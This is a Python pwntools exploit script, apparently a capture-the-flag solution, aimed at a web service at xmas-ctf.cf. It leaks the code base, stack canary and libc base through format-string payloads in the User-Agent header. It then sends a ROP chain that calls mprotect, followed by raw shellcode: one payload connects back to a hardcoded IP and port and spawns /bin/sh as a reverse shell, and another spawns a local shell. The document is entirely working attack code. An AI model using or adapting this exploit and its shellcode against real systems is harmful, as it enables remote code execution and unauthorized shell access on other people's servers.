from pwn import *
from requests import get
from base64 import b64encode 

url='http://xmas-ctf.cf:10000/'

slog=lambda x,y : success(x+' : '+hex(y))

def attack(pay):
    p.sendline('GET / HTTP/1.1\r\nUser-Agent: '+pay)

def attack2(pay,pay2,pay3):
    p.sendline('GET /?x='+b64encode(pay2)+'&'+pay3+'='+b64encode(pay)+' HTTP/1.1') 

def parse(res):
    return res[res.find('[GET] / - ')+10:res.find('</small>')] 

p=remote('xmas-ctf.cf',10000)
attack('%p')
cb=int(parse(p.recvall()),16)-0x2006
slog('code_base',cb)

p=remote('xmas-ctf.cf',10000) 
attack('%29$p')
canary=int(parse(p.recvall()),16)
slog('canary',canary)

p=remote('xmas-ctf.cf',10000)
attack('%37$p')
leak=int(parse(p.recvall()),16)
libc=leak-0x202e1
slog('libc_base',libc)

system=libc+0x3f480
libc_csu=cb+0x1d92 #0 1 callee edi rsi rdx
mprotect=libc+0xe44d0
add_rsp_8=cb+0xc4a
pop_rdi=cb+0x1d9b

p=remote('xmas-ctf.cf',10000)
pay='A'*0x48+p64(canary)+'b'*8
pay+=p64(libc_csu)+p64(0)+p64(1)+p64(cb+0x203200)+p64(cb+0x203200)+p64(0x1000)+p64(7)+p64(cb+0x1d78)+p64(pop_rdi)+p64(cb+0x203000)+p64(mprotect)
pay+=p64(cb+0x203208)

pay2=p64(pop_rdi)
pay2+='\x68\x0d\x7c\xd1\x8b\x66\x68\x7a\x69\x66\x6a\x02\x6a\x2a\x6a\x10\x6a\x29\x6a\x01\x6a\x02\x5f\x5e\x48\x31\xd2\x58\x0f\x05\x48\x89\xc7\x5a\x58\x48\x89\xe6\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05'
pay3='\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05'

attack2(pay,pay2,pay3)

p.interactive()
